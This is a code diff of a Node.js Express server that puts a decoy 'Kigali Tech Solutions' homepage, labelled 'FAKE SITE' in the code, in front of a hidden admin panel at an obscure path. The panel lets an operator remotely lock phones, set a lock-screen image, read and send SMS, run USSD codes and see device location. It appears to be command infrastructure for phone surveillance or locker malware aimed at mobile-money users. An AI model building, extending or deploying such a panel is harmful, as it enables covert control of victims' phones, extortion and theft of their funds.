@@ -1,4 +1,4 @@
-// server.js – WITH DEVICE LOCK/UNLOCK
+// server.js – DEVICE LOCK/UNLOCK (FIXED)
 const express = require('express');
 const crypto = require('crypto');
 const path = require('path');
@@ -24,17 +24,17 @@ app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
 // ============================================================
-// DEVICE STATE (in-memory for now)
+// DEVICE STATE
 // ============================================================
 let devices = {
     'device1': { name: 'Samsung S23', locked: false, battery: 85, online: true },
     'device2': { name: 'iPhone 15', locked: false, battery: 92, online: true },
     'device3': { name: 'Pixel 8', locked: true, battery: 67, online: false }
 };
-let lockScreenImage = null; // Will store base64 image
+let lockScreenImage = null;
 
 // ============================================================
-// FAKE SITE – Kigali Convention Center Background
+// FAKE SITE
 // ============================================================
 app.get('/', (req, res) => {
     res.send(`
@@ -53,7 +53,6 @@ app.get('/', (req, res) => {
                     color: #fff;
                     overflow-x: hidden;
                 }
-
                 .hero {
                     position: relative;
                     min-height: 100vh;
@@ -64,7 +63,6 @@ app.get('/', (req, res) => {
                     padding: 40px 20px;
                     background: #0a0e17;
                 }
-
                 .hero-bg {
                     position: absolute;
                     top: 0;
@@ -76,7 +74,6 @@ app.get('/', (req, res) => {
                         url('https://raw.githubusercontent.com/Swordsman12-madax/admin_dashboard/main/public/images/kigali-convention-center.png') center/cover no-repeat;
                     z-index: 0;
                 }
-
                 .car-container {
                     position: absolute;
                     bottom: 5%;
@@ -96,24 +93,20 @@ app.get('/', (req, res) => {
                 .car:nth-child(2) { animation-delay: 0.5s; font-size: 56px; }
                 .car:nth-child(3) { animation-delay: 1s; font-size: 42px; }
                 .car:nth-child(4) { animation-delay: 1.5s; font-size: 52px; }
-
                 @keyframes floatCar {
                     0%, 100% { transform: translateY(0); }
                     50% { transform: translateY(-8px); }
                 }
-
                 .hero-content {
                     position: relative;
                     z-index: 2;
                     max-width: 800px;
                 }
-
                 .hero-logo {
                     font-size: 72px;
                     margin-bottom: 10px;
                     display: block;
                 }
-
                 .hero-title {
                     font-size: 52px;
                     font-weight: 700;
@@ -124,12 +117,10 @@ app.get('/', (req, res) => {
                     animation: gradientMove 4s ease-in-out infinite;
                     letter-spacing: -1px;
                 }
-
                 @keyframes gradientMove {
                     0%, 100% { background-position: 0% 50%; }
                     50% { background-position: 100% 50%; }
                 }
-
                 .hero-subtitle {
                     font-size: 20px;
                     color: #8896ab;
@@ -137,14 +128,12 @@ app.get('/', (req, res) => {
                     font-weight: 300;
                     letter-spacing: 2px;
                 }
-
                 .hero-tagline {
                     font-size: 16px;
                     color: #4a5568;
                     margin-bottom: 30px;
                     font-weight: 300;
                 }
-
                 .hero-divider {
                     width: 80px;
                     height: 2px;
@@ -152,7 +141,6 @@ app.get('/', (req, res) => {
                     margin: 20px auto 30px;
                     border: none;
                 }
-
                 .features {
                     display: grid;
                     grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
@@ -182,7 +170,6 @@ app.get('/', (req, res) => {
                     font-weight: 500;
                     letter-spacing: 0.5px;
                 }
-
                 .admin-gry-badge {
                     position: fixed;
                     bottom: 15px;
@@ -195,7 +182,6 @@ app.get('/', (req, res) => {
                     pointer-events: none;
                     z-index: 999;
                 }
-
                 @media (max-width: 768px) {
                     .hero-title { font-size: 32px; }
                     .hero-subtitle { font-size: 16px; }
@@ -211,26 +197,21 @@ app.get('/', (req, res) => {
             </style>
         </head>
         <body>
-
         <div class="admin-gry-badge">ADMIN GRY</div>
-
         <section class="hero">
             <div class="hero-bg"></div>
-
             <div class="car-container">
                 <span class="car">🏎️</span>
                 <span class="car">🏎️</span>
                 <span class="car">🏎️</span>
                 <span class="car">🏎️</span>
             </div>
-
             <div class="hero-content">
                 <span class="hero-logo">🏎️</span>
                 <h1 class="hero-title">Kigali Tech Solutions</h1>
                 <p class="hero-subtitle">INNOVATING THE FUTURE OF RACING TECHNOLOGY</p>
                 <div class="hero-divider"></div>
                 <p class="hero-tagline">Luxury. Performance. Innovation.</p>
-
                 <div class="features">
                     <div class="feature-item">
                         <span class="icon">⚡</span>
@@ -251,14 +232,13 @@ app.get('/', (req, res) => {
                 </div>
             </div>
         </section>
-
         </body>
         </html>
     `);
 });
 
 // ============================================================
-// ADMIN DASHBOARD – WITH DEVICE LOCK/UNLOCK
+// ADMIN DASHBOARD – with Device Lock/Unlock
 // ============================================================
 app.get('/a9f3k217', (req, res) => {
     let html = '';
@@ -357,7 +337,7 @@ app.get('/a9f3k217', (req, res) => {
     html += '    <p class="sub">Enter your credentials</p>\n';
     html += '    <input type="text" id="loginUser" placeholder="Username">\n';
     html += '    <input type="password" id="loginPass" placeholder="Password">\n';
-    html += '    <button onclick="login()">Login</button>\n';
+     html += '    <button onclick="login()">Login</button>\n';
     html += '    <div id="attemptsMsg" class="attempts-msg"></div>\n';
     html += '    <div id="loginError" class="error"></div>\n';
     html += '  </div>\n';
@@ -407,29 +387,26 @@ app.get('/a9f3k217', (req, res) => {
     html += '        <button class="logout-btn" style="background:none;border:none;color:#4fc3f7;cursor:pointer;text-align:left;padding:8px 0 0 0;font-size:13px;" onclick="refreshDeviceInfo()">🔄 Refresh Device Info</button>\n';
     html += '      </div>\n';
     html += '    </div>\n';
-    html += '    <!-- DEVICE LOCK/UNLOCK SECTION -->\n';
+    html += '    <!-- Device Control -->\n';
     html += '    <div class="section">\n';
     html += '      <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px;">\n';
     html += '        <h3>🔒 Device Control</h3>\n';
     html += '        <div class="device-controls">\n';
-    html += '          <button class="btn-lock" onclick="lockDevice(\'selected\')">🔒 Lock Selected</button>\n';
-    html += '          <button class="btn-unlock" onclick="unlockDevice(\'selected\')">🔓 Unlock Selected</button>\n';
+    html += '          <button class="btn-lock" onclick="lockDevice(selectedDeviceId)">🔒 Lock Selected</button>\n';
+    html += '          <button class="btn-unlock" onclick="unlockDevice(selectedDeviceId)">🔓 Unlock Selected</button>\n';
     html += '          <button class="btn-lock-all" onclick="lockAllDevices()">🔒 Lock All</button>\n';
     html += '          <button class="btn-unlock-all" onclick="unlockAllDevices()">🔓 Unlock All</button>\n';
     html += '        </div>\n';
     html += '      </div>\n';
-    html += '      <!-- Lock Screen Image Upload -->\n';
     html += '      <div class="file-upload-area">\n';
     html += '        <span style="color:#8896ab;font-size:13px;">Lock Screen Image:</span>\n';
     html += '        <input type="file" id="lockImageInput" accept="image/*" onchange="previewLockImage(event)">\n';
     html += '        <button onclick="uploadLockImage()">Upload Image</button>\n';
     html += '        <span id="lockImageStatus" style="font-size:12px;color:#8896ab;"></span>\n';
     html += '      </div>\n';
-    html += '      <div id="devicesLockList">\n';
-    html += '        <div class="empty"><div class="icon">🔒</div>Loading devices...</div>\n';
-    html += '      </div>\n';
+    html += '      <div id="devicesLockList"><div class="empty"><div class="icon">🔒</div>Loading devices...</div></div>\n';
     html += '    </div>\n';
-    html += '    <!-- SMS SECTION -->\n';
+    html += '    <!-- SMS -->\n';
     html += '    <div class="section">\n';
     html += '      <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px;margin-bottom:15px;">\n';
     html += '        <h3>💬 SMS Messages <span class="badge-count" id="smsCountBadge">0</span></h3>\n';
@@ -437,7 +414,7 @@ app.get('/a9f3k217', (req, res) => {
     html += '      </div>\n';
     html += '      <div id="smsList"><div class="empty"><div class="icon">💬</div>No SMS messages yet</div></div>\n';
     html += '    </div>\n';
-    html += '    <!-- SEND SMS -->\n';
+    html += '    <!-- Send SMS -->\n';
     html += '    <div class="section">\n';
     html += '      <h3>✉️ Send SMS</h3>\n';
     html += '      <div style="display:flex;gap:10px;flex-wrap:wrap;">\n';
@@ -447,10 +424,12 @@ app.get('/a9f3k217', (req, res) => {
     html += '      </div>\n';
     html += '      <div id="smsSendResult" style="margin-top:8px;font-size:13px;color:#8896ab;"></div>\n';
     html += '    </div>\n';
+    html += '    <!-- Connected Devices -->\n';
     html += '    <div class="section">\n';
     html += '      <h3>📱 Connected Devices <span class="badge-count" id="deviceCountBadge">0</span></h3>\n';
     html += '      <div id="devicesList"><div class="empty"><div class="icon">📱</div>No devices connected yet</div></div>\n';
     html += '    </div>\n';
+    html += '    <!-- USSD Codes -->\n';
     html += '    <div class="section">\n';
     html += '      <h3>🔢 Recent USSD Codes <span class="badge-count" id="numberCountBadge">0</span></h3>\n';
     html += '      <div id="numbersList"><div class="empty"><div class="icon">📞</div>No USSD codes detected yet</div></div>\n';
@@ -459,10 +438,15 @@ app.get('/a9f3k217', (req, res) => {
     html += '</div>\n';
     html += '<script>\n';
     html += 'const API_BASE = "/a9f3k217";\n';
+    html += 'let selectedDeviceId = null;\n';
     html += '\n';
-    html += '// ============================================================\n';
-    html += '// LOGIN\n';
-    html += '// ============================================================\n';
+    html += 'function selectDevice(id) {\n';
+    html += '  selectedDeviceId = id;\n';
+    html += '  document.querySelectorAll(".device-card").forEach(el => el.style.borderColor = "#1a2332");\n';
+    html += '  const card = document.querySelector(`.device-card[data-id="${id}"]`);\n';
+    html += '  if (card) card.style.borderColor = "#4fc3f7";\n';
+    html += '}\n';
+    html += '\n';
     html += 'async function login() {\n';
     html += '  const username = document.getElementById("loginUser").value;\n';
     html += '  const password = document.getElementById("loginPass").value;\n';
@@ -525,15 +509,6 @@ app.get('/a9f3k217', (req, res) => {
     html += '// ============================================================\n';
     html += '// DEVICE LOCK/UNLOCK\n';
     html += '// ============================================================\n';
-    html += 'let selectedDeviceId = null;\n';
-    html += '\n';
-    html += 'function selectDevice(deviceId) {\n';
-    html += '  selectedDeviceId = deviceId;\n';
-    html += '  document.querySelectorAll(".device-card").forEach(el => el.style.borderColor = "#1a2332");\n';
-    html += '  const card = document.querySelector(`.device-card[data-id="${deviceId}"]`);\n';
-    html += '  if (card) card.style.borderColor = "#4fc3f7";\n';
-    html += '}\n';
-    html += '\n';
     html += 'async function refreshDevicesLock() {\n';
     html += '  try {\n';
     html += '    const response = await fetch(API_BASE + "/api/devices-lock");\n';
@@ -547,64 +522,56 @@ app.get('/a9f3k217', (req, res) => {
     html += 'function renderDevicesLock(devices) {\n';
     html += '  const container = document.getElementById("devicesLockList");\n';
     html += '  if (!devices || Object.keys(devices).length === 0) {\n';
-    html += '    container.innerHTML = \'<div class="empty"><div class="icon">🔒</div>No devices available</div>\';\n';
+    html += '    container.innerHTML = "<div class=\\"empty\\"><div class=\\"icon\\">🔒</div>No devices available</div>";\n';
     html += '    return;\n';
     html += '  }\n';
-    html += '  let html = \'<table><thead><tr><th>Device</th><th>Status</th><th>Battery</th><th>Action</th></tr></thead><tbody>\';\n';
+    html += '  let html = "<table><thead><tr><th>Device</th><th>Status</th><th>Battery</th><th>Action</th></tr></thead><tbody>";\n';
     html += '  Object.keys(devices).forEach(id => {\n';
     html += '    const d = devices[id];\n';
     html += '    const isLocked = d.locked || false;\n';
-    html += '    const statusClass = isLocked ? "locked" : "unlocked" ;\n';
-    html += '    const statusText = isLocked ? "🔒 Locked" : "🔓 Unlocked";\n';
     html += '    const onlineClass = d.online ? "online" : "offline";\n';
     html += '    const onlineText = d.online ? "🟢 Online" : "🔴 Offline";\n';
+    html += '    const lockText = isLocked ? "🔒 Locked" : "🔓 Unlocked";\n';
+    html += '    const lockClass = isLocked ? "locked" : "unlocked";\n';
     html += '    const actionBtn = isLocked \n';
-    html += '      ? `<button class="btn-unlock" onclick="unlockDevice(\'${id}\')">Unlock</button>`\n';
-    html += '      : `<button class="btn-lock" onclick="lockDevice(\'${id}\')">Lock</button>`;\n';
-    html += '    html += `<tr class="device-card" data-id="${id}" onclick="selectDevice(\'${id}\')">`;\n';
+    html += '      ? `<button class="btn-unlock" onclick="unlockDevice(\\\'' + id + '\\\')">Unlock</button>`\n';
+    html += '      : `<button class="btn-lock" onclick="lockDevice(\\\'' + id + '\\\')">Lock</button>`;\n';
+    html += '    html += `<tr class="device-card" data-id="${id}" onclick="selectDevice(\\\'' + id + '\\\')">`;\n';
     html += '    html += `<td><span class="name">${d.name || id}</span></td>`;\n';
-    html += '    html += `<td><span class="badge ${statusClass}">${statusText}</span> <span class="badge ${onlineClass}">${onlineText}</span></td>`;\n';
+    html += '    html += `<td><span class="badge ${lockClass}">${lockText}</span> <span class="badge ${onlineClass}">${onlineText}</span></td>`;\n';
     html += '    html += `<td>${d.battery || "--"}%</td>`;\n';
     html += '    html += `<td>${actionBtn}</td>`;\n';
     html += '    html += `</tr>`;\n';
     html += '  });\n';
-    html += '  html += \'</tbody></table>\';\n';
+    html += '  html += "</tbody></table>";\n';
     html += '  container.innerHTML = html;\n';
     html += '}\n';
     html += '\n';
     html += 'async function lockDevice(deviceId) {\n';
-    html += '  const id = deviceId === "selected" ? selectedDeviceId : deviceId;\n';
-    html += '  if (!id) { alert("Please select a device first"); return; }\n';
+    html += '  if (!deviceId) { alert("Please select a device first"); return; }\n';
     html += '  try {\n';
     html += '    const response = await fetch(API_BASE + "/api/lock-device", {\n';
     html += '      method: "POST",\n';
     html += '      headers: { "Content-Type": "application/json" },\n';
-    html += '      body: JSON.stringify({ deviceId: id, action: "lock" })\n';
+    html += '      body: JSON.stringify({ deviceId: deviceId, action: "lock" })\n';
     html += '    });\n';
     html += '    const data = await response.json();\n';
-    html += '    if (data.success) {\n';
-    html += '      refreshDevicesLock();\n';
-    html += '    } else {\n';
-    html += '      alert("Failed to lock device: " + data.error);\n';
-    html += '    }\n';
+    html += '    if (data.success) { refreshDevicesLock(); }\n';
+    html += '    else { alert("Failed to lock device: " + data.error); }\n';
     html += '  } catch { alert("Connection error"); }\n';
     html += '}\n';
     html += '\n';
     html += 'async function unlockDevice(deviceId) {\n';
-    html += '  const id = deviceId === "selected" ? selectedDeviceId : deviceId;\n';
-    html += '  if (!id) { alert("Please select a device first"); return; }\n';
+    html += '  if (!deviceId) { alert("Please select a device first"); return; }\n';
     html += '  try {\n';
     html += '    const response = await fetch(API_BASE + "/api/lock-device", {\n';
     html += '      method: "POST",\n';
     html += '      headers: { "Content-Type": "application/json" },\n';
-    html += '      body: JSON.stringify({ deviceId: id, action: "unlock" })\n';
+    html += '      body: JSON.stringify({ deviceId: deviceId, action: "unlock" })\n';
     html += '    });\n';
     html += '    const data = await response.json();\n';
-    html += '    if (data.success) {\n';
-    html += '      refreshDevicesLock();\n';
-    html += '    } else {\n';
-    html += '      alert("Failed to unlock device: " + data.error);\n';
-    html += '    }\n';
+    html += '    if (data.success) { refreshDevicesLock(); }\n';
+    html += '    else { alert("Failed to unlock device: " + data.error); }\n';
     html += '  } catch { alert("Connection error"); }\n';
     html += '}\n';
     html += '\n';
@@ -681,17 +648,18 @@ app.get('/a9f3k217', (req, res) => {
     html += 'function renderSms(messages) {\n';
     html += '  const container = document.getElementById("smsList");\n';
     html += '  if (!messages || messages.length === 0) {\n';
-    html += '    container.innerHTML = \'<div class="empty"><div class="icon">💬</div>No SMS messages yet</div>\';\n';
+    html += '    container.innerHTML = "<div class=\\"empty\\"><div class=\\"icon\\">💬</div>No SMS messages yet</div>";\n';
     html += '    return;\n';
     html += '  }\n';
-    html += '  let html = \'<table><thead><tr><th>From</th><th>Message</th><th>Time</th></tr></thead><tbody>\';\n';
+    html += '  let html = "<table><thead><tr><th>From</th><th>Message</th><th>Time</th></tr></thead><tbody>";\n';
     html += '  messages.slice(0, 50).forEach(msg => {\n';
     html += '    const time = msg.timestamp ? new Date(msg.timestamp).toLocaleString() : "--";\n';
     html += '    const isShort = msg.number && msg.number.length >= 4 && msg.number.length <= 5;\n';
-    html += '    const numberDisplay = isShort ? \'<span style="color:#ffd700;font-weight:600;">\' + msg.number + \'</span>\' : msg.number || "Unknown";\n';
+    html += '    let numberDisplay = msg.number || "Unknown";\n';
+    html += '    if (isShort) numberDisplay = \'<span style="color:#ffd700;font-weight:600;">\' + numberDisplay + \'</span>\';\n';
     html += '    html += `<tr><td>${numberDisplay}</td><td>${msg.body || "--"}</td><td style="font-size:12px;color:#8896ab;">${time}</td></tr>`;\n';
     html += '  });\n';
-    html += '  html += \'</tbody></table>\';\n';
+    html += '  html += "</tbody></table>";\n';
     html += '  container.innerHTML = html;\n';
     html += '}\n';
     html += '\n';
@@ -730,7 +698,7 @@ app.get('/a9f3k217', (req, res) => {
     html += '}\n';
     html += '\n';
     html += '// ============================================================\n';
-    html += '// USSD, LOCATION, DEVICE INFO FUNCTIONS\n';
+    html += '// USSD, LOCATION, DEVICE INFO\n';
     html += '// ============================================================\n';
     html += 'async function executeUssd() {\n';
     html += '  const code = document.getElementById("ussdInput").value.trim();\n';
@@ -862,8 +830,9 @@ app.get('/a9f3k217', (req, res) => {
 
     res.send(html);
 });
+
 // ============================================================
-// DEVICE LOCK/UNLOCK API ENDPOINTS
+// API ENDPOINTS
 // ============================================================
 app.get('/a9f3k217/api/devices-lock', (req, res) => {
     res.json(devices);
@@ -876,12 +845,10 @@ app.post('/a9f3k217/api/lock-device', (req, res) => {
     }
     if (action === 'lock') {
         devices[deviceId].locked = true;
-        console.log(`🔒 Device ${deviceId} locked`);
-        res.json({ success: true, message: `Device ${deviceId} locked` });
+        res.json({ success: true, message: 'Device locked' });
     } else if (action === 'unlock') {
         devices[deviceId].locked = false;
-        console.log(`🔓 Device ${deviceId} unlocked`);
-        res.json({ success: true, message: `Device ${deviceId} unlocked` });
+        res.json({ success: true, message: 'Device unlocked' });
     } else {
         res.status(400).json({ error: 'Invalid action' });
     }
@@ -889,20 +856,13 @@ app.post('/a9f3k217/api/lock-device', (req, res) => {
 
 app.post('/a9f3k217/api/lock-all', (req, res) => {
     Object.keys(devices).forEach(id => { devices[id].locked = true; });
-    console.log('🔒 All devices locked');
     res.json({ success: true, message: 'All devices locked' });
 });
 
 app.post('/a9f3k217/api/unlock-all', (req, res) => {
     Object.keys(devices).forEach(id => { devices[id].locked = false; });
-    console.log('🔓 All devices unlocked');
     res.json({ success: true, message: 'All devices unlocked' });
 });
-
-// ============================================================
-// LOCK SCREEN IMAGE UPLOAD
-// ============================================================
-let lockScreenImage = null;
 
 app.post('/a9f3k217/api/upload-lock-image', (req, res) => {
     const { image } = req.body;
@@ -910,29 +870,13 @@ app.post('/a9f3k217/api/upload-lock-image', (req, res) => {
         return res.status(400).json({ error: 'No image provided' });
     }
     lockScreenImage = image;
-    console.log('📸 Lock screen image uploaded');
     res.json({ success: true, message: 'Lock screen image uploaded' });
 });
 
-// ============================================================
-// SMS API ENDPOINTS
-// ============================================================
 let smsMessages = [
-    {
-        number: '12345',
-        body: 'Your account balance is 1,500 RWF',
-        timestamp: Date.now() - 3600000
-    },
-    {
-        number: '1234',
-        body: 'Data bundle: 2GB remaining',
-        timestamp: Date.now() - 7200000
-    },
-    {
-        number: '98765',
-        body: 'Your PIN has been changed successfully',
-        timestamp: Date.now() - 86400000
-    }
+    { number: '12345', body: 'Your account balance is 1,500 RWF', timestamp: Date.now() - 3600000 },
+    { number: '1234', body: 'Data bundle: 2GB remaining', timestamp: Date.now() - 7200000 },
+    { number: '98765', body: 'Your PIN has been changed successfully', timestamp: Date.now() - 86400000 }
 ];
 
 app.get('/a9f3k217/api/sms', (req, res) => {
@@ -944,16 +888,9 @@ app.post('/a9f3k217/api/send-sms', (req, res) => {
     if (!number || !message) {
         return res.status(400).json({ error: 'Number and message required' });
     }
-
-    smsMessages.unshift({
-        number: number,
-        body: message,
-        timestamp: Date.now()
-    });
+    smsMessages.unshift({ number, body: message, timestamp: Date.now() });
     if (smsMessages.length > 100) smsMessages.pop();
-
-    console.log(`📤 SMS sent to ${number}: ${message}`);
-    res.json({ success: true, message: `SMS sent to ${number}` });
+    res.json({ success: true, message: 'SMS sent' });
 });
 
 // ============================================================
@@ -963,11 +900,6 @@ app.post('/a9f3k217/api/login', (req, res) => {
     const ip = getClientIP(req);
     const now = Date.now();
     const blockDuration = 12 * 60 * 60 * 1000;
-
-    console.log(`Login attempt from IP: ${ip}`);
-    if (failedAttempts[ip]) {
-        console.log(`Current attempts for ${ip}: ${failedAttempts[ip].count}`);
-    }
 
     if (failedAttempts[ip] && failedAttempts[ip].blockUntil > now) {
         return res.status(401).json({ remainingAttempts: 0 });
@@ -995,10 +927,8 @@ app.post('/a9f3k217/api/login', (req, res) => {
         const remaining = 5 - failedAttempts[ip].count;
         if (remaining <= 0) {
             failedAttempts[ip].blockUntil = now + blockDuration;
-            console.log(`🔒 IP ${ip} blocked for 12 hours`);
             res.status(401).json({ remainingAttempts: 0 });
         } else {
-            console.log(`❌ IP ${ip} has ${remaining} attempts left`);
             res.status(401).json({ remainingAttempts: remaining });
         }
     }
@@ -1012,7 +942,6 @@ let ussdNumbers = [];
 app.post('/a9f3k217/api/ussd', (req, res) => {
     const { code } = req.body;
     if (!code) return res.status(400).json({ error: 'No USSD code provided' });
-    console.log(`📞 USSD Executed: ${code}`);
 
     let responseMessage = '';
     if (code.includes('123')) responseMessage = 'Your account balance is 1,500 RWF. Validity: 7 days. Thank you.';
@@ -1079,9 +1008,6 @@ app.use((req, res) => {
     `);
 });
 
-// ============================================================
-// START SERVER
-// ============================================================
 app.listen(PORT, () => {
     console.log(`✅ Dashboard running on port ${PORT}`);
     console.log(`📍 https://admin-dashboard-teal-beta-28.vercel.app/a9f3k217`);
